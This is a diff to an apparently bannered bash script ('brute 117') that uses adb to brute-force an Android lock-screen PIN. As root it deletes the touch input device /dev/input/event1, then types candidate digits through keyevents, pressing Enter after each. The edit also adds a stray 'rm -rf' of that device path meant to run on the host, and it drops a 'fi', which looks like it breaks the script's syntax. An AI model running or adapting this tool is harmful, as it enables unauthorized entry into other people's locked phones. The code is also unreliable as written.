@@ -11,8 +11,11 @@ echo -e " ))~~~~~~~~~~~~~(( "
 echo -e "(( > brute 117 < ))"
 echo -e " )).............(( "
 echo -e "(((<-._.-'<-._.-)))"
-adb shell "su 0 rm -rf /dev/input/event1"
-# rm -rf /dev/input/event1
+
+adb shell su 0 "rm -rf /dev/input/event1"
+
+# su
+rm -rf /dev/input/event1
 adb shell rm -rf /dev/input/event1
 adb shell input keyevent 3
 adb shell input keyevent 82
@@ -58,7 +61,6 @@ do
                     adb shell input keyevent $((`echo ${i:$j:1}`+7))
                 done
                 adb shell input keyevent 66
-            fi
             elif ( [[ $((10#$i)) != 5 ]] || [[ $((10#$i)) != 10 ]] ) && [[ $((10#$i)) -gt 10 ]] && ( [[ $((10#$i)) -gt 40 ]] || [[ $((10#$i)) -eq 40 ]] ); then
                 echo -e "(( >  timeout  < ))"
                 echo -e "(((<-._.-'<-._.-)))"
